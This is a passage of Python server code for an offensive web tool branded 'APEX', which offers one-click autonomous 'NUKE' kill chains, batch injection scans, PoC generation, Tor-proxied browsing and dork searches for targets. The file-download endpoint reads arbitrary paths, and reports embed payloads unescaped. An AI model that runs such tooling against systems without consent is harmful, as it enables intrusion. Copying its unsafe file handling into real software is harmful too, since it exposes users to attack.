<p>{len(vulnerabilities)} vulnerabilities discovered: <span class="badge crit">{critical} Critical</span> <span class="badge high">{high} High</span> <span class="badge med">{medium} Medium</span> <span class="badge low">{low} Low</span></p>
<p>Exploits executed: {len(exploits)} | Successful: {sum(1 for e in exploits if e.get('success'))}</p>
</div>

<h2>Vulnerability Details</h2>
<table><tr><th>Type</th><th>Severity</th><th>Endpoint</th><th>Parameter</th><th>Payload</th></tr>"""
    
    for v in vulnerabilities:
        sev = v.get('severity', 'low')
        sev_class = {'critical': 'crit', 'high': 'high', 'medium': 'med', 'low': 'low'}.get(sev, 'low')
        html += f"<tr><td>{v.get('type','N/A').upper()}</td><td><span class='badge {sev_class}'>{sev.upper()}</span></td><td>{v.get('endpoint','N/A')}</td><td>{v.get('parameter','N/A')}</td><td><pre>{v.get('payload','')[:80]}</pre></td></tr>"
    
    html += "</table>"
    
    if exploits:
        html += "<h2>Exploit Timeline</h2>"
        for e in exploits:
            status = '✅' if e.get('success') else '❌'
            html += f"<div class='card'>{status} {e.get('label','')}<br><small>{e.get('result','')}</small></div>"
    
    html += "<h2>Remediation Recommendations</h2><div class='card'><ul>"
    for v in vulnerabilities[:5]:
        html += f"<li>Fix {v.get('type','').upper()} on {v.get('endpoint','')}: sanitize input, use parameterized queries, implement CSP</li>"
    html += "</ul></div></body></html>"
    
    filepath = os.path.join(Config.REPORT_FOLDER, f'{report_id}.html')
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html)
    
    emit_feed('report', f'Report generated: {report_id}.html', 'success')
    return jsonify({'report_id': report_id, 'filepath': filepath, 'html': html})

# ============================================================
# SUBDOMAIN ENUMERATION ENDPOINT
# ============================================================
@app.route('/api/subdomains/enumerate', methods=['POST'])
@login_required
def api_subdomain_enum():
    data = request.get_json()
    domain = data.get('domain', '')
    if not domain: return jsonify({'error': 'Domain required'}), 400
    # Strip protocol
    domain = domain.replace('https://', '').replace('http://', '').split('/')[0]
    
    try:
        from modules.recon.subdomain_enum import enumerate_subdomains
        subdomains = enumerate_subdomains(domain)
        emit_feed('subdomain', f'Subdomain enumeration: {len(subdomains)} found for {domain}', 'success')
        return jsonify({'domain': domain, 'subdomains': subdomains, 'count': len(subdomains)})
    except Exception as e:
        # Fallback: basic enumeration
        subdomains = basic_subdomain_enum(domain)
        return jsonify({'domain': domain, 'subdomains': subdomains, 'count': len(subdomains), 'method': 'basic'})

def basic_subdomain_enum(domain):
    common_subs = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'staging', 'test', 'blog', 'shop',
                   'cdn', 'secure', 'vpn', 'portal', 'remote', 'webmail', 'dashboard', 'app', 'm']
    found = []
    for sub in common_subs:
        try:
            hostname = f'{sub}.{domain}'
            socket.gethostbyname(hostname)
            found.append(hostname)
        except:
            pass
    return found

# ============================================================
# SESSION SAVE/RESTORE ENDPOINTS
# ============================================================
@app.route('/api/session/save', methods=['POST'])
@login_required
def api_session_save():
    data = request.get_json()
    name = data.get('name', f'session_{int(time.time())}')
    session_data = data.get('data', {})
    os.makedirs(Config.SESSION_DIR, exist_ok=True)
    filepath = os.path.join(Config.SESSION_DIR, f'{name}.json')
    with open(filepath, 'w') as f:
        json.dump({'saved_at': datetime.now().isoformat(), 'data': session_data}, f)
    return jsonify({'success': True, 'name': name, 'filepath': filepath})

@app.route('/api/session/list', methods=['GET'])
@login_required
def api_session_list():
    os.makedirs(Config.SESSION_DIR, exist_ok=True)
    sessions = []
    for f in os.listdir(Config.SESSION_DIR):
        if f.endswith('.json'):
            filepath = os.path.join(Config.SESSION_DIR, f)
            try:
                with open(filepath, 'r') as fp:
                    s = json.load(fp)
                sessions.append({'name': f.replace('.json', ''), 'saved_at': s.get('saved_at', ''), 'filepath': filepath})
            except: pass
    sessions.sort(key=lambda x: x['saved_at'], reverse=True)
    return jsonify({'sessions': sessions})

@app.route('/api/session/load/<name>', methods=['GET'])
@login_required
def api_session_load(name):
    filepath = os.path.join(Config.SESSION_DIR, f'{name}.json')
    if not os.path.exists(filepath):
        return jsonify({'error': 'Session not found'}), 404
    with open(filepath, 'r') as f:
        session_data = json.load(f)
    return jsonify(session_data)

@app.route('/api/session/delete/<name>', methods=['DELETE'])
@login_required
def api_session_delete(name):
    filepath = os.path.join(Config.SESSION_DIR, f'{name}.json')
    if os.path.exists(filepath):
        os.remove(filepath)
        return jsonify({'success': True})
    return jsonify({'error': 'Not found'}), 404

# ============================================================
# WEBHOOK ENDPOINTS
# ============================================================
def send_webhook_notification(event_type, message, details=None):
    """Send notification to configured webhooks."""
    payload = {
        'event': event_type,
        'message': message,
        'timestamp': datetime.now().isoformat(),
        'details': details or {}
    }
    
    # Discord
    if Config.DISCORD_WEBHOOK_URL:
        try:
            discord_payload = {
                'embeds': [{
                    'title': f'APEX — {event_type}',
                    'description': message,
                    'color': 0xf97316,
                    'timestamp': datetime.now().isoformat(),
                    'fields': [{'name': k, 'value': str(v)[:200], 'inline': True} for k, v in (details or {}).items()][:5]
                }]
            }
            requests.post(Config.DISCORD_WEBHOOK_URL, json=discord_payload, timeout=5)
        except: pass
    
    # Telegram
    if Config.TELEGRAM_BOT_TOKEN and Config.TELEGRAM_CHAT_ID:
        try:
            tg_text = f"🔺 *APEX — {event_type}*\n{message}"
            if details:
                tg_text += '\n\n' + '\n'.join(f'• *{k}*: {v}' for k, v in list(details.items())[:5])
            requests.post(
                f'https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage',
                json={'chat_id': Config.TELEGRAM_CHAT_ID, 'text': tg_text, 'parse_mode': 'Markdown'},
                timeout=5
            )
        except: pass

@app.route('/api/webhooks/test', methods=['POST'])
@login_required
def api_webhook_test():
    data = request.get_json()
    # Temporarily set config
    if data.get('discord_url'):
        Config.DISCORD_WEBHOOK_URL = data['discord_url']
    if data.get('telegram_token'):
        Config.TELEGRAM_BOT_TOKEN = data['telegram_token']
    if data.get('telegram_chat_id'):
        Config.TELEGRAM_CHAT_ID = data['telegram_chat_id']
    
    send_webhook_notification('Test', 'APEX webhook test — connection successful!', {'status': 'online'})
    return jsonify({'success': True, 'message': 'Test notification sent'})

@app.route('/api/webhooks/settings', methods=['POST'])
@login_required
def api_webhook_settings():
    data = request.get_json()
    if data.get('discord_url') is not None:
        Config.DISCORD_WEBHOOK_URL = data['discord_url']
    if data.get('telegram_token') is not None:
        Config.TELEGRAM_BOT_TOKEN = data['telegram_token']
    if data.get('telegram_chat_id') is not None:
        Config.TELEGRAM_CHAT_ID = data['telegram_chat_id']
    return jsonify({'success': True})

# ============================================================
# TARGET QUEUE ENDPOINTS
# ============================================================
target_queue = []
queue_running = False

@app.route('/api/queue/add', methods=['POST'])
@login_required
def api_queue_add():
    data = request.get_json()
    target = data.get('target', '')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    target_queue.append({'target': target, 'status': 'queued', 'added': datetime.now().isoformat()})
    emit_feed('queue', f'Target added to queue: {target} ({len(target_queue)} total)', 'info')
    return jsonify({'queue_size': len(target_queue), 'target': target})

@app.route('/api/queue/list', methods=['GET'])
@login_required
def api_queue_list():
    return jsonify({'queue': target_queue, 'running': queue_running})

@app.route('/api/queue/clear', methods=['POST'])
@login_required
def api_queue_clear():
    global target_queue
    target_queue = []
    return jsonify({'success': True})

@app.route('/api/queue/start', methods=['POST'])
@login_required
def api_queue_start():
    global queue_running
    if queue_running: return jsonify({'error': 'Queue already running'}), 400
    if not target_queue: return jsonify({'error': 'Queue is empty'}), 400
    queue_running = True
    thread = threading.Thread(target=process_queue)
    thread.daemon = True
    thread.start()
    return jsonify({'success': True, 'queue_size': len(target_queue)})

def process_queue():
    global queue_running, target_queue
    for i, item in enumerate(target_queue):
        if item['status'] == 'completed': continue
        target = item['target']
        item['status'] = 'scanning'
        scan_id = f"queue_scan_{int(time.time())}"
        emit_feed('queue', f'[{i+1}/{len(target_queue)}] Scanning: {target}', 'info')
        try:
            run_full_scan(scan_id, target, 'full')
            item['status'] = 'completed'
            item['scan_id'] = scan_id
            send_webhook_notification('Queue Scan Complete', f'Scan completed: {target}', 
                                      {'target': target, 'scan_id': scan_id})
        except Exception as e:
            item['status'] = 'failed'
            item['error'] = str(e)
    queue_running = False
    emit_feed('queue', f'Queue processing complete — {len(target_queue)} targets', 'success')
    send_webhook_notification('Queue Complete', f'All {len(target_queue)} targets processed',
                              {'total': len(target_queue)})

# ============================================================
# SCREENSHOT ENDPOINT
# ============================================================
@app.route('/api/screenshot/capture', methods=['POST'])
@login_required
def api_screenshot_capture():
    data = request.get_json()
    url = data.get('url', '')
    if not url: return jsonify({'error': 'URL required'}), 400
    if not url.startswith('http'): url = 'https://' + url
    
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1280,800')
        
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        time.sleep(2)
        
        os.makedirs(os.path.join('static', 'screenshots'), exist_ok=True)
        filename = f'screenshot_{int(time.time())}.png'
        filepath = os.path.join('static', 'screenshots', filename)
        driver.save_screenshot(filepath)
        driver.quit()
        
        with open(filepath, 'rb') as f:
            img_b64 = base64.b64encode(f.read()).decode()
        
        emit_feed('screenshot', f'Screenshot captured: {url}', 'success')
        return jsonify({
            'success': True,
            'url': f'/static/screenshots/{filename}',
            'base64': f'data:image/png;base64,{img_b64}',
            'filename': filename
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ============================================================
# APEX v3.0 — NEW ENDPOINTS
# Nuke, Batch Scan, PoC, Scan Compare, PDF Report, Auth Import, Proxy Health, OSINT
# ============================================================

@app.route('/api/nuke', methods=['POST'])
@login_required
def api_nuke():
    """Execute the full autonomous kill chain (NUKE mode)."""
    data = request.get_json()
    target = data.get('target', '')
    options = data.get('options', {})
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    
    emit_feed('nuke', f'☢️ NUKE MODE ACTIVATED — Target: {target}', 'system')
    
    # Run nuke in background thread
    def run_nuke_thread():
        try:
            result = nuke_engine.nuke(target, options)
            emit_feed('nuke', f'☢️ NUKE COMPLETE — {len(result.get("vulnerabilities", []))} vulns found', 'success')
            socketio.emit('nuke_complete', result)
        except Exception as e:
            emit_feed('nuke', f'NUKE FAILED: {str(e)}', 'error')
    
    thread = threading.Thread(target=run_nuke_thread)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'started', 'target': target, 'message': 'NUKE mode initiated — full autonomous kill chain in progress'})

@app.route('/api/scan/batch', methods=['POST'])
@login_required
def api_batch_scan():
    """Run a scan as part of a batch (simplified, returns quickly)."""
    data = request.get_json()
    target = data.get('target', '')
    scan_type = data.get('scan_type', 'full')
    if not target: return jsonify({'error': 'Target required'}), 400
    if not target.startswith('http'): target = 'https://' + target
    
    scan_id = f"batch_{int(time.time())}"
    scan_results[scan_id] = {
        'id': scan_id, 'target': target, 'type': scan_type,
        'status': 'running', 'started': datetime.now().isoformat(),
        'vulnerabilities': [], 'progress': 0
    }
    
    # Run a quick scan (fewer pages, fewer scanners)
    def run_batch_scan():
        try:
            discovered = crawl_target(target, max_pages=5)
            all_vulns = []
            for name, scanner_func, _ in [('XSS', scan_xss, 0), ('SQL Injection', scan_sqli, 0), ('Command Injection', scan_cmdi, 0)]:
                try:
                    results = scanner_func(target, discovered)
                    all_vulns.extend(results)
                except: pass
            scan_results[scan_id]['vulnerabilities'] = all_vulns
            scan_results[scan_id]['status'] = 'completed'
            scan_results[scan_id]['vulns_found'] = len(all_vulns)
            emit_feed(scan_id, f'Batch scan complete: {target} — {len(all_vulns)} vulns', 'success')
        except Exception as e:
            scan_results[scan_id]['status'] = 'failed'
            scan_results[scan_id]['error'] = str(e)
    
    thread = threading.Thread(target=run_batch_scan)
    thread.daemon = True
    thread.start()
    
    return jsonify({'scan_id': scan_id, 'target': target, 'status': 'started'})

@app.route('/api/poc/generate', methods=['POST'])
@login_required
def api_poc_generate():
    """Generate a PoC HTML file for a vulnerability."""
    data = request.get_json()
    vuln = data.get('vulnerability', {})
    if not vuln: return jsonify({'error': 'Vulnerability data required'}), 400
    
    try:
        filepath, filename = generate_poc_for_vuln(vuln)
        emit_feed('poc', f'PoC generated: {filename}', 'success')
        return jsonify({'filepath': filepath, 'filename': filename, 'success': True})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/poc/download', methods=['GET'])
@login_required
def api_poc_download():
    """Download a generated PoC file."""
    filepath = request.args.get('file', '')
    if not filepath or not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404
    return send_file(filepath, as_attachment=True)

@app.route('/api/scan/compare', methods=['GET'])
@login_required
def api_scan_compare():
    """Compare two scans and show differences."""
    scan1_id = request.args.get('scan1', '')
    scan2_id = request.args.get('scan2', '')
    
    if not scan1_id or not scan2_id:
        return jsonify({'error': 'Both scan1 and scan2 IDs required'}), 400
    
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('SELECT vulns_json FROM scan_history WHERE id=?', (scan1_id,))
    row1 = c.fetchone()
    c.execute('SELECT vulns_json FROM scan_history WHERE id=?', (scan2_id,))
    row2 = c.fetchone()
    conn.close()
    
    if not row1 or not row2:
        return jsonify({'error': 'One or both scans not found'}), 404
    
    try:
        vulns1 = json.loads(row1[0]) if row1[0] else []
        vulns2 = json.loads(row2[0]) if row2[0] else []
    except:
        vulns1, vulns2 = [], []
    
    # Find new vulns (in scan2 but not scan1)
    sig1 = set(f"{v.get('type','')}|{v.get('endpoint','')}|{v.get('parameter','')}" for v in vulns1)
    sig2 = set(f"{v.get('type','')}|{v.get('endpoint','')}|{v.get('parameter','')}" for v in vulns2)
    
    new_vulns = [v for v in vulns2 if f"{v.get('type','')}|{v.get('endpoint','')}|{v.get('parameter','')}" not in sig1]
    fixed_vulns = [v for v in vulns1 if f"{v.get('type','')}|{v.get('endpoint','')}|{v.get('parameter','')}" not in sig2]
    
    return jsonify({
        'scan1': {'id': scan1_id, 'vulns': len(vulns1)},
        'scan2': {'id': scan2_id, 'vulns': len(vulns2)},
        'new_vulns': new_vulns,
        'fixed_vulns': fixed_vulns,
        'new_count': len(new_vulns),
        'fixed_count': len(fixed_vulns)
    })

@app.route('/api/report/pdf', methods=['GET'])
@login_required
def api_report_pdf():
    """Generate and download a PDF report."""
    scan_id = request.args.get('scan_id', '')
    
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    if scan_id:
        c.execute('SELECT * FROM scan_history WHERE id=?', (scan_id,))
    else:
        c.execute('SELECT * FROM scan_history ORDER BY started DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    
    if not row:
        return jsonify({'error': 'No scan data found'}), 404
    
    target = row[1]
    try:
        vulns = json.loads(row[13]) if row[13] else []
    except:
        vulns = []
    
    # Generate HTML report
    os.makedirs(Config.REPORT_FOLDER, exist_ok=True)
    report_id = f"report_{int(time.time())}"
    
    critical = len([v for v in vulns if v.get('severity') == 'critical'])
    high = len([v for v in vulns if v.get('severity') == 'high'])
    medium = len([v for v in vulns if v.get('severity') == 'medium'])
    low = len([v for v in vulns if v.get('severity') == 'low'])
    
    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>APEX Report — {target}</title>
<style>
body {{ font-family: 'Inter', sans-serif; background: #fff; color: #1a1a1a; padding: 40px; max-width: 900px; margin: 0 auto; }}
h1 {{ color: #e0650a; font-size: 28px; border-bottom: 3px solid #e0650a; padding-bottom: 12px; }}
h2 {{ color: #e0650a; font-size: 18px; margin-top: 30px; border-bottom: 1px solid #ddd; padding-bottom: 8px; }}
.card {{ background: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; padding: 16px; margin: 12px 0; }}
.badge {{ display: inline-block; padding: 3px 10px; border-radius: 10px; font-size: 11px; font-weight: 700; margin: 0 4px; }}
.crit {{ background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }}
.high {{ background: #fff7ed; color: #ea580c; border: 1px solid #fed7aa; }}
.med {{ background: #fffbeb; color: #d97706; border: 1px solid #fde68a; }}
.low {{ background: #ecfdf5; color: #059669; border: 1px solid #a7f3d0; }}
pre {{ background: #f5f5f5; padding: 10px; border-radius: 6px; font-size: 11px; overflow-x: auto; border: 1px solid #e5e5e5; }}
table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
th {{ text-align: left; padding: 10px 8px; border-bottom: 2px solid #ddd; color: #666; font-size: 10px; text-transform: uppercase; background: #fafafa; }}
td {{ padding: 8px; border-bottom: 1px solid #eee; font-size: 12px; }}
.footer {{ margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 10px; color: #999; text-align: center; }}
</style></head><body>
<h1>🔺 APEX v3.0 — Penetration Test Report</h1>
<p><strong>Target:</strong> {target}</p>
<p><strong>Scan ID:</strong> {row[0]}</p>
<p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<h2>Executive Summary</h2>
<div class="card">
<p><strong>{len(vulns)} vulnerabilities discovered:</strong></p>
<p>
<span class="badge crit">{critical} Critical</span>
<span class="badge high">{high} High</span>
<span class="badge med">{medium} Medium</span>
<span class="badge low">{low} Low</span>
</p>
<p><strong>Exploits Run:</strong> {row[8]} | <strong>Successful:</strong> {row[9]}</p>
<p><strong>Scan Duration:</strong> {row[10]} to {row[11]}</p>
</div>

<h2>Vulnerability Details</h2>
<table>
<tr><th>#</th><th>Type</th><th>Severity</th><th>Endpoint</th><th>Parameter</th><th>Description</th></tr>"""
    
    for i, v in enumerate(vulns):
        sev = v.get('severity', 'low')
        sev_class = {'critical': 'crit', 'high': 'high', 'medium': 'med', 'low': 'low'}.get(sev, 'low')
        html += f"""<tr>
<td>{i+1}</td>
<td><strong>{v.get('type','N/A').upper()}</strong></td>
<td><span class="badge {sev_class}">{sev.upper()}</span></td>
<td style="font-family:monospace;font-size:11px;">{v.get('endpoint','N/A')}</td>
<td>{v.get('parameter','N/A')}</td>
<td style="font-size:11px;">{v.get('description','')}</td>
</tr>"""
    
    html += """</table>

<h2>Remediation Recommendations</h2>
<div class="card"><ol>"""
    
    for v in vulns[:10]:
        vtype = v.get('type', '').upper()
        endpoint = v.get('endpoint', '')
        html += f"<li><strong>{vtype}:</strong> {v.get('description','Fix the vulnerability on ' + endpoint)}</li>"
    
    html += """</ol></div>

<div class="footer">
<p>Generated by APEX v3.0 — Autonomous Pentest Arsenal</p>
<p>FOR AUTHORIZED SECURITY TESTING ONLY</p>
</div>
</body></html>"""
    
    filepath = os.path.join(Config.REPORT_FOLDER, f'{report_id}.html')
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html)
    
    # Try PDF generation with weasyprint if available
    try:
        from weasyprint import HTML
        pdf_path = os.path.join(Config.REPORT_FOLDER, f'{report_id}.pdf')
        HTML(string=html).write_pdf(pdf_path)
        return send_file(pdf_path, as_attachment=True, download_name=f'APEX_Report_{target.replace("https://","").replace("http://","").split("/")[0]}.pdf')
    except:
        # Fallback: send HTML
        return send_file(filepath, as_attachment=True, download_name=f'APEX_Report_{target.replace("https://","").replace("http://","").split("/")[0]}.html')

@app.route('/api/auth/import_curl', methods=['POST'])
@login_required
def api_auth_import_curl():
    """Import cookies and headers from a curl command or raw HTTP request."""
    data = request.get_json()
    curl_command = data.get('curl_command', '')
    if not curl_command:
        return jsonify({'error': 'No curl command provided'}), 400
    
    result = {'success': False, 'cookies': {}, 'headers': {}, 'target_url': ''}
    
    try:
        # Parse curl command
        # Extract URL
        url_match = re.search(r"(?:curl\s+(?:.*\s+)?)?['\"]?(https?://[^\s'\"]+)", curl_command)
        if url_match:
            result['target_url'] = url_match.group(1)
        
        # Extract cookies from -b or --cookie or Cookie: header
        cookie_match = re.search(r"(?:-b|--cookie)\s+['\"]?([^'\"]+)", curl_command)
        if cookie_match:
            cookie_str = cookie_match.group(1)
            for pair in cookie_str.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    result['cookies'][k.strip()] = v.strip()
        
        # Extract Cookie: header from -H
        header_cookies = re.findall(r"-H\s+['\"]Cookie:\s*([^'\"]+)", curl_command, re.IGNORECASE)
        for hc in header_cookies:
            for pair in hc.split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    result['cookies'][k.strip()] = v.strip()
        
        # Extract headers from -H
        headers = re.findall(r"-H\s+['\"]([^'\"]+)", curl_command)
        for h in headers:
            if ':' in h:
                k, v = h.split(':', 1)
                k = k.strip()
                if k.lower() != 'cookie':
                    result['headers'][k] = v.strip()
        
        # Extract data from -d or --data
        data_match = re.search(r"(?:-d|--data(?:-raw)?)\s+['\"]([^'\"]+)", curl_command)
        if data_match:
            result['post_data'] = data_match.group(1)
        
        if result['cookies'] or result['headers']:
            result['success'] = True
            # Store in config for auth-aware scanning
            Config.AUTH_COOKIES = '; '.join(f'{k}={v}' for k, v in result['cookies'].items())
            Config.AUTH_ENABLED = True
            emit_feed('auth', f'Cookies imported: {len(result["cookies"])} cookies, {len(result["headers"])} headers', 'success')
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/proxy/health', methods=['GET'])
@login_required
def api_proxy_health():
    """Check health of configured proxies."""
    healthy = 0
    total = 0
    
    try:
        if os.path.exists(Config.PROXY_LIST_FILE):
            with open(Config.PROXY_LIST_FILE, 'r') as f:
                proxies = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            total = len(proxies)
            
            for proxy in proxies[:5]:  # Check first 5
                try:
                    test_resp = requests.get('https://httpbin.org/ip', 
                                            proxies={'http': proxy, 'https': proxy}, 
                                            timeout=5)
                    if test_resp.status_code == 200:
                        healthy += 1
                except:
                    pass
        
        return jsonify({
            'healthy': healthy > 0,
            'active_proxies': healthy,
            'total_proxies': total,
            'proxy_enabled': Config.PROXY_ENABLED
        })
    except Exception as e:
        return jsonify({'healthy': False, 'error': str(e), 'active_proxies': 0, 'total_proxies': 0})

@app.route('/api/osint/profile', methods=['POST'])
@login_required
def api_osint_profile():
    """Run OSINT profiling on a target domain."""
    data = request.get_json()
    domain = data.get('domain', '')
    if not domain: return jsonify({'error': 'Domain required'}), 400
    
    try:
        profile = osint_engine.profile_target(domain)
        emit_feed('osint', f'OSINT profile complete: {domain} — {profile.get("summary", "")}', 'success')
        return jsonify({'domain': domain, 'profile': profile})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# APEX v3.0 — BROWSER ENDPOINTS
# ============================================================

@app.route('/api/browser/proxy', methods=['POST'])
@login_required
def api_browser_proxy():
    """Fetch a page through VPN/Tor proxy and return processed HTML."""
    data = request.get_json()
    url = data.get('url', '')
    if not url: return jsonify({'error': 'URL required'}), 400
    
    result = browser_proxy.fetch_page(url)
    if result.get('success'):
        emit_feed('browser', f'Page loaded: {url}', 'info')
    return jsonify(result)

@app.route('/api/browser/view')
@login_required
def api_browser_view():
    """Serve a proxied page directly so the iframe can load it via src= instead of srcdoc.
    This allows JavaScript-heavy pages (like XSS game) to work properly."""
    url = request.args.get('url', '')
    if not url:
        return '<html><body><h2>No URL specified</h2></body></html>', 400
    
    result = browser_proxy.fetch_page(url)
    if result.get('success') and result.get('html'):
        resp = make_response(result['html'])
        resp.headers['Content-Type'] = 'text/html; charset=utf-8'
        resp.headers['X-Frame-Options'] = 'SAMEORIGIN'
        resp.headers['Content-Security-Policy'] = "frame-ancestors 'self' *;"
        return resp
    
    error_msg = result.get('error', 'Failed to load page')
    return f'<html><body style="background:#000;color:#e53935;font-family:monospace;padding:40px;text-align:center;"><h2>Failed to Load</h2><p>{error_msg}</p></body></html>', 502

@app.route('/api/browser/search', methods=['POST'])
@login_required
def api_browser_search():
    """Search for targets using the hacker search engine."""
    data = request.get_json()
    query = data.get('query', '')
    search_type = data.get('type', 'web')
    
    if not query: return jsonify({'error': 'Query required'}), 400
    
    result = target_search.search(query, search_type)
    emit_feed('browser', f'Search: {query} — {result.get("count", 0)} results', 'info')
    return jsonify(result)

@app.route('/api/browser/search/dork', methods=['POST'])
@login_required
def api_browser_search_dork():
    """Search using pre-built dork queries."""
    data = request.get_json()
    dork_type = data.get('dork_type', 'admin_panels')
    
    result = target_search.search_dork(dork_type)
    emit_feed('browser', f'Dork search: {dork_type} — {result.get("count", 0)} results', 'info')
    return jsonify(result)

@app.route('/api/browser/analyze', methods=['POST'])
@login_required
def api_browser_analyze():
    """AI-analyze a page for vulnerabilities."""
    data = request.get_json()
    url = data.get('url', '')
    if not url: return jsonify({'error': 'URL required'}), 400
    
    # Fetch page info
    page_result = browser_proxy.fetch_page(url)
    if not page_result.get('success'):
        return jsonify({'analysis': f'Failed to load page: {page_result.get("error", "Unknown")}'})
    
    info = page_result.get('page_info', {})
    
    # Build analysis
    analysis_parts = []
    analysis_parts.append(f"<strong>{info.get('title', 'No title')}</strong>")
    analysis_parts.append(f"Status: {info.get('status_code', '?')} | Forms: {info.get('forms_count', 0)} | Links: {info.get('links_count', 0)}")
    
    if info.get('detected_tech'):
        analysis_parts.append(f"🖥️ Tech: {', '.join(info['detected_tech'])}")
    if info.get('server'):
        analysis_parts.append(f"📡 Server: {info['server']}")
    if info.get('powered_by'):
        analysis_parts.append(f"⚡ Powered by: {info['powered_by']}")
    
    # Analyze forms for vulnerabilities
    forms = info.get('forms', [])
    if forms:
        analysis_parts.append(f"📝 {len(forms)} form(s) detected:")
        for f in forms:
            csrf_status = '✅ CSRF protected' if f.get('has_csrf') else '⚠️ NO CSRF PROTECTION'
            inputs_str = ', '.join(i['name'] for i in f.get('inputs', [])[:5])
            analysis_parts.append(f"  → {f['method'].upper()} {f['action']} — {len(f.get('inputs',[]))} inputs — {csrf_status}")
            if not f.get('has_csrf') and f['method'] in ('post', ''):
                analysis_parts.append(f"    🔴 VULNERABLE: Missing CSRF token on POST form")
    
    # Check for common vuln indicators
    if info.get('status_code') == 200:
        if info.get('forms_count', 0) > 0 and not any(f.get('has_csrf') for f in forms if f.get('method') in ('post', '')):
            analysis_parts.append("🔴 CSRF vulnerability likely — forms without protection detected")
        if info.get('server', '').lower() in ('apache/2.2', 'apache/2.0', 'iis/6.0', 'nginx/0.'):
            analysis_parts.append("🟠 Outdated server version — may have known CVEs")
    
    analysis = '<br>'.join(analysis_parts)
    return jsonify({'analysis': analysis, 'page_info': info})

@socketio.on('connect')
def handle_connect():
    emit('connected', {'status': 'ok'})

@socketio.on('request_feed')
def handle_feed_request():
    emit('feed_history', live_feed[-50:])

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║          🔺  A P E X  🔺                ║
    ║   Running on http://0.0.0.0:80           ║
    ╚══════════════════════════════════════════╝
    """)
    socketio.run(app, host='0.0.0.0', port=80, debug=False, allow_unsafe_werkzeug=True)
